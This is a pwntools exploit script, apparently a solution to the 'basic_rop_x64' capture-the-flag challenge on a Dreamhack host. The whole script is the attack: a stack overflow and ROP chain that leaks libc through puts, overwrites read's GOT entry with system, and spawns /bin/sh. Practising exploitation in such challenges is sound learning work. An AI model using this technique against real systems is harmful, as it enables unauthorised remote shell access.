from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games",15335)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

read_plt=e.plt['read']
read_got=e.got['read']
puts_plt=e.plt['puts']
pop_rdi=0x0000000000400883
pop_rsi_pop_r15=0x0000000000400881
payload=b'A'*0x48

payload+=p64(pop_rdi)+p64(read_got)
payload+=p64(puts_plt)

payload+=p64(pop_rdi)+p64(0)
payload+=p64(pop_rsi_pop_r15)+p64(read_got)+p64(0)
payload+=p64(read_plt)

payload+=p64(pop_rdi)
payload+=p64(read_got+0x8)
payload+=p64(read_plt)

p.sendline(payload)

print(p.recvuntil('A'*0x40))
read = u64(p.recvn(6)+b"\x00"*2)
lb=read-libc.symbols["read"]
system=lb+libc.symbols["system"]

payload2 = b'B'*0x48
payload2 += p64(pop_rdi)

p.send(p64(system)+b"/bin/sh\x00")
p.interactive()
